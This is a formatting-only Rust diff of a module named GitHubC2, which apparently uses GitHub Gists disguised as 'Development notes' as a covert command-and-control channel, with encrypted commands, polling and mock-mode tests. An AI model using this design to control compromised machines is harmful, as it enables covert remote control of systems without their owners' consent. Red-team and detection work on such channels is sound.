@@ -88,8 +88,18 @@ pub struct GistComment {
 trait GitHubApiClient: Send + Sync {
     async fn create_gist(&self, token: &str, req: &CreateGistRequest) -> Result<Gist>;
     async fn get_gist(&self, token: &str, gist_id: &str) -> Result<Gist>;
-    async fn update_gist(&self, token: &str, gist_id: &str, req: &CreateGistRequest) -> Result<Gist>;
-    async fn create_comment(&self, token: &str, gist_id: &str, comment: &str) -> Result<GistComment>;
+    async fn update_gist(
+        &self,
+        token: &str,
+        gist_id: &str,
+        req: &CreateGistRequest,
+    ) -> Result<Gist>;
+    async fn create_comment(
+        &self,
+        token: &str,
+        gist_id: &str,
+        comment: &str,
+    ) -> Result<GistComment>;
     async fn list_comments(&self, token: &str, gist_id: &str) -> Result<Vec<GistComment>>;
 }
 
@@ -137,12 +147,15 @@ impl GitHubApiClient for HttpGitHubClient {
             bail!("Failed to get Gist: {}", resp.status());
         }
 
-        resp.json::<Gist>()
-            .await
-            .context("Failed to parse Gist")
+        resp.json::<Gist>().await.context("Failed to parse Gist")
     }
 
-    async fn update_gist(&self, token: &str, gist_id: &str, req: &CreateGistRequest) -> Result<Gist> {
+    async fn update_gist(
+        &self,
+        token: &str,
+        gist_id: &str,
+        req: &CreateGistRequest,
+    ) -> Result<Gist> {
         let client = reqwest::Client::new();
         let url = format!("{}/gists/{}", GITHUB_API_BASE, gist_id);
         let resp = client
@@ -164,7 +177,12 @@ impl GitHubApiClient for HttpGitHubClient {
             .context("Failed to parse updated Gist")
     }
 
-    async fn create_comment(&self, token: &str, gist_id: &str, comment: &str) -> Result<GistComment> {
+    async fn create_comment(
+        &self,
+        token: &str,
+        gist_id: &str,
+        comment: &str,
+    ) -> Result<GistComment> {
         let client = reqwest::Client::new();
         let url = format!("{}/gists/{}/comments", GITHUB_API_BASE, gist_id);
 
@@ -273,7 +291,10 @@ impl GitHubApiClient for MockGitHubClient {
             html_url: Some(format!("https://gist.github.com/{}", gist_id)),
         };
 
-        self.gists.lock().await.insert(gist_id.clone(), gist.clone());
+        self.gists
+            .lock()
+            .await
+            .insert(gist_id.clone(), gist.clone());
         self.comments.lock().await.insert(gist_id, Vec::new());
         Ok(gist)
     }
@@ -287,7 +308,12 @@ impl GitHubApiClient for MockGitHubClient {
             .ok_or_else(|| anyhow!("Gist not found"))
     }
 
-    async fn update_gist(&self, _token: &str, gist_id: &str, req: &CreateGistRequest) -> Result<Gist> {
+    async fn update_gist(
+        &self,
+        _token: &str,
+        gist_id: &str,
+        req: &CreateGistRequest,
+    ) -> Result<Gist> {
         let mut gists = self.gists.lock().await;
         if let Some(gist) = gists.get_mut(gist_id) {
             gist.description = req.description.clone();
@@ -302,7 +328,12 @@ impl GitHubApiClient for MockGitHubClient {
         }
     }
 
-    async fn create_comment(&self, _token: &str, gist_id: &str, comment: &str) -> Result<GistComment> {
+    async fn create_comment(
+        &self,
+        _token: &str,
+        gist_id: &str,
+        comment: &str,
+    ) -> Result<GistComment> {
         let comment_obj = GistComment {
             id: Some(chrono::Utc::now().timestamp_millis()),
             body: comment.to_string(),
@@ -319,7 +350,8 @@ impl GitHubApiClient for MockGitHubClient {
     }
 
     async fn list_comments(&self, _token: &str, gist_id: &str) -> Result<Vec<GistComment>> {
-        Ok(self.comments
+        Ok(self
+            .comments
             .lock()
             .await
             .get(gist_id)
@@ -340,9 +372,15 @@ impl GitHubC2 {
     pub fn new() -> Self {
         let mut options = HashMap::new();
         options.insert("access_token".to_string(), String::new());
-        options.insert("gist_description".to_string(), "Development notes".to_string());
+        options.insert(
+            "gist_description".to_string(),
+            "Development notes".to_string(),
+        );
         options.insert("gist_filename".to_string(), "notes.txt".to_string());
-        options.insert("poll_interval".to_string(), DEFAULT_POLL_INTERVAL_SECS.to_string());
+        options.insert(
+            "poll_interval".to_string(),
+            DEFAULT_POLL_INTERVAL_SECS.to_string(),
+        );
         options.insert("mock_mode".to_string(), "true".to_string());
         options.insert("encryption_key".to_string(), String::new());
         options.insert("max_iterations".to_string(), "3".to_string());
@@ -742,7 +780,9 @@ mod tests {
     #[tokio::test]
     async fn test_github_c2_mock_mode() {
         let mut module = GitHubC2::new();
-        module.set_option("access_token", "ghp_mock_token_123456").unwrap();
+        module
+            .set_option("access_token", "ghp_mock_token_123456")
+            .unwrap();
         module
             .set_option("encryption_key", "test-password-123")
             .unwrap();
@@ -794,7 +834,11 @@ mod tests {
         // Inject an encrypted command
         let encrypted_cmd = module.encrypt_command("test-command").unwrap();
         mock_client
-            .inject_command(&gist.id, "notes.txt", &format!("ENCRYPTED:{}", encrypted_cmd))
+            .inject_command(
+                &gist.id,
+                "notes.txt",
+                &format!("ENCRYPTED:{}", encrypted_cmd),
+            )
             .await;
 
         // Run one tick
